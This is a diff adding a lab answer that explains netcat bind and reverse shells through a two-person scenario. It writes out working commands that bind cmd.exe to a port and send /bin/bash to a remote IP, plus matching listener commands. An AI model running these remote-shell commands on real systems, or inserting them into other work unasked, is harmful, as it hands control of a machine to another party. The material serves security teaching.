@@ -149,3 +149,40 @@ with your teammate]
 3.c. What is netcat’s gaping security hole? Recreate and explain it.
 ```
   
+## 3.a
+
+Let's consider a few scenarios:
+
+### Bind shell
+
+![image](https://github.com/user-attachments/assets/ab52926e-35d2-46b9-b85a-0e0488610b76)
+
+In our first scenario, Joel (running on Windows) reached out to Lesha (running on Linux) for help and asked her to connect to his computer and execute some commands remotely. Joel has a public IP address and is directly connected to the internet. Lesha, however, is behind a NAT and has an internal IP address. Joel needs to bind cmd.exe to a TCP port on his public IP address and ask Katya to connect to his specific IP address and port. Joel will run Netcat with the -e parameter to execute cmd.exe:
+
+```sh
+nc -nlvp 4444 -e cmd.exe
+```
+
+Now, Netcat has bound TCP port 4444 to cmd.exe and will redirect any input, output, or error messages from cmd.exe over the network. In other words, anyone connecting to TCP port 4444 on Joel’s machine (hopefully Lesha) will see Joel's command prompt. This is truly a "gaping security hole"!
+
+```
+nc -nv 192.168.0.178 4444
+```
+
+### Reverse shell
+
+![image](https://github.com/user-attachments/assets/783cfac1-6fbc-4ba1-a68e-60fc68b4009f)
+
+In our second scenario, Lesha needs Joel's help. Here, we can use another useful feature of Netcat — the ability to send commands to a host that is listening on a specific port. In this situation, Lesha cannot (as per the scenario) bind port 4444 for /bin/bash locally (bind shell) on her computer and wait for Joel to connect, but she can transfer control of her bash to Joel's computer. This is called a reverse shell. For this to work, Joel will first set up Netcat to listen. In our example, we'll use port 4444:
+
+```
+nc -nlvp 4444
+```
+
+Now, Lesha can send Joel a reverse shell from her Linux machine. Again, we use the `-e` option to make an application available remotely, which in this case is `/bin/bash`, the Linux shell:
+
+```
+nc -nv 192.168.0.178 4444 -e /bin/bash
+```
+
+
